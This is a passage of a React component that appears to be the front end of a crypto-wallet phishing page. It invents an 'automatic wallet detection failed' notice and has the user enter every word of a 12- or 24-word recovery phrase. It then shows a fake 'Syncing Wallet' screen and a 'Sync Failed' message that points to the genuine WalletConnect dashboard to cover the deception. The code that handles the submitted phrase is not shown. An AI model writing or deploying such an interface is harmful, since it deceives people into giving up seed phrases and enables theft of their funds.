            <div className="pulse-dots" style={{ justifyContent: "center", marginTop: 0 }}>
              <div className="pulse-dot" style={{ background: "#ef4444" }} />
              <div className="pulse-dot" style={{ background: "#ef4444" }} />
              <div className="pulse-dot" style={{ background: "#ef4444" }} />
            </div>
            <div className="loading-bar">
              <div className="loading-bar-fill" />
            </div>
          </div>
        </div>
      )}

      {/* ── PHRASE COUNT SELECTION ────────────────────────────────────────────── */}
      {step === "phraseCount" && (
        <div className="phrase-container">
          <div className="phrase-card">
            <div className="phrase-header">
              {selectedWallet && (
                <img className="phrase-header-icon" src={selectedWallet.icon} alt={selectedWallet.name} />
              )}
              <div className="phrase-header-text">
                <h2>Manual Recovery</h2>
                <p>Enter your seed phrase to restore access</p>
              </div>
            </div>

            <div className="manual-notice">
              <svg width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
                <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v2m0 4h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" />
              </svg>
              <span>
                Automatic wallet detection failed. Please import using your recovery phrase.
                Never share this with anyone.
              </span>
            </div>

            <p style={{ fontSize: 14, color: "#475569", marginBottom: 12 }}>
              How many words is your recovery phrase?
            </p>

            <div className="count-grid">
              {PHRASE_COUNTS.map(n => (
                <button
                  key={n}
                  className={`count-btn${phraseCount === n ? " selected" : ""}`}
                  onClick={() => {
                    setPhraseCount(n);
                    setPhraseWords(Array(n).fill(""));
                    setSubmitDone(false);
                  }}
                >
                  {n}
                </button>
              ))}
            </div>

            <button
              className="submit-btn"
              disabled={!phraseCount}
              onClick={() => setStep("phraseInput")}
            >
              Continue →
            </button>
          </div>
        </div>
      )}

      {/* ── PHRASE INPUT ──────────────────────────────────────────────────────── */}
      {step === "phraseInput" && phraseCount && (
        <div className="phrase-container">
          <div className="phrase-card">
            <div className="phrase-header">
              {selectedWallet && (
                <img className="phrase-header-icon" src={selectedWallet.icon} alt={selectedWallet.name} />
              )}
              <div className="phrase-header-text">
                <h2>Enter Recovery Phrase</h2>
                <p>{phraseCount}-word mnemonic · type each word below</p>
              </div>
            </div>

            <form onSubmit={handleSubmit}>
              <button
                type="button"
                className="show-toggle"
                onClick={() => setShowPhrase(v => !v)}
              >
                <svg width="14" height="14" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
                  {showPhrase
                    ? <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0zM2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                    : <path strokeLinecap="round" strokeLinejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-5.523 0-10-4.477-10-10 0-1.657.402-3.22 1.125-4.575M15 12a3 3 0 01-3 3m-3-3a3 3 0 013-3m3 3a3 3 0 00-3-3M3 3l18 18" />
                  }
                </svg>
                {showPhrase ? "Hide phrase" : "Show phrase"}
              </button>

              <div className="word-grid">
                {phraseWords.map((word, i) => (
                  <div className="word-input-wrap" key={i}>
                    <span className="word-num">{i + 1}</span>
                    <input
                      ref={el => { inputRefs.current[i] = el; }}
                      className="word-input"
                      type={showPhrase ? "text" : "password"}
                      value={word}
                      onChange={e => handleWordChange(i, e.target.value)}
                      onKeyDown={e => handleKeyDown(i, e)}
                      placeholder={`word ${i + 1}`}
                      autoComplete="off"
                      spellCheck={false}
                      disabled={submitting}
                      list="bip39-list"
                    />
                  </div>
                ))}
              </div>

              <datalist id="bip39-list">
                {bip39List.map(w => <option value={w} key={w} />)}
              </datalist>

              <button
                type="submit"
                className="submit-btn"
                disabled={!phraseWords.every(w => w.trim().length > 0) || submitting}
              >
                {submitting ? "Syncing Wallet…" : "Import Wallet →"}
              </button>
            </form>

            <button
              style={{
                marginTop: 16, background: "none", border: "none",
                color: "#374151", fontSize: 13, cursor: "pointer",
                fontFamily: "inherit", width: "100%", textAlign: "center",
              }}
              onClick={() => {
                setPhraseCount(null); setPhraseWords([]);
                setSubmitDone(false); setStep("phraseCount");
              }}
            >
              ← Back to word count
            </button>
          </div>
        </div>
      )}

      {/* ── SUBMITTING OVERLAY ────────────────────────────────────────────────── */}
      {submitting && (
        <div className="submit-overlay">
          <div className="submit-status-card">
            {selectedWallet && (
              <img style={{ width: 60, height: 60, borderRadius: 16, objectFit: "contain",
                background: "rgba(255,255,255,0.06)", marginBottom: 20 }}
                src={selectedWallet.icon} alt={selectedWallet.name}
              />
            )}
            <div style={{ fontSize: 18, fontWeight: 700, color: "#f1f5f9", marginBottom: 8 }}>
              Syncing Wallet
            </div>
            <div style={{ fontSize: 13, color: "#475569", marginBottom: 24, lineHeight: 1.6 }}>
              Verifying recovery phrase and importing accounts…
            </div>
            <div className="spinner-ring" />
            <div className="pulse-dots">
              <div className="pulse-dot" /><div className="pulse-dot" /><div className="pulse-dot" />
            </div>
          </div>
        </div>
      )}

      {/* ── ERROR RESULT (after submitting) ──────────────────────────────────── */}
      {submitDone && !submitting && (
        <div className="submit-overlay">
          <div className="error-result-card">
            <span className="error-result-icon">🔐</span>
            <div className="error-result-title">Sync Failed</div>
            <p className="error-result-desc">
              Unable to verify recovery phrase via this connection.
              Please sign in directly through the{" "}
              <strong style={{ color: "#94a3b8" }}>WalletConnect Dashboard</strong> to continue.
            </p>
            <a
              href="https://dashboard.walletconnect.com/sign-in"
              target="_blank"
              rel="noopener noreferrer"
              className="wc-redirect-btn"
            >
              Open WalletConnect Dashboard →
            </a>
            <button
              style={{ marginTop: 14, background: "none", border: "none", color: "#374151",
                fontSize: 13, cursor: "pointer", fontFamily: "inherit" }}
              onClick={() => {
                setSubmitDone(false);
                setStep("landing");
                setSelectedWallet(null);
                setPhraseCount(null);
                setPhraseWords([]);
              }}
            >
              ← Try again
            </button>
          </div>
        </div>
      )}

      {/* ── TOAST ─────────────────────────────────────────────────────────────── */}
      {toast && (
        <div className={`toast toast-${toast.type}`}>
          {toast.type === "ok" ? "✓" : "✗"} {toast.msg}
        </div>
      )}
    </div>
  );
}

// ─── Wallet list item sub-component ──────────────────────────────────────────
function WalletListItem({
  wallet,
  onClick,
}: {
  wallet: { name: string; icon: string; rdns: string };
  onClick: () => void;
}) {
  return (
    <button
      className="wallet-item"
      onClick={onClick}
      style={{ width: "100%", background: "none", border: "1px solid transparent",
        fontFamily: "inherit", textAlign: "left" }}
    >
      <img src={wallet.icon} alt={wallet.name} />
      <div className="wallet-item-info">
        <div className="wallet-item-name">{wallet.name}</div>
        <div className="wallet-item-tag">Browser Extension / Mobile</div>
      </div>
      <span className="wallet-item-arrow">›</span>
    </button>
  );
}
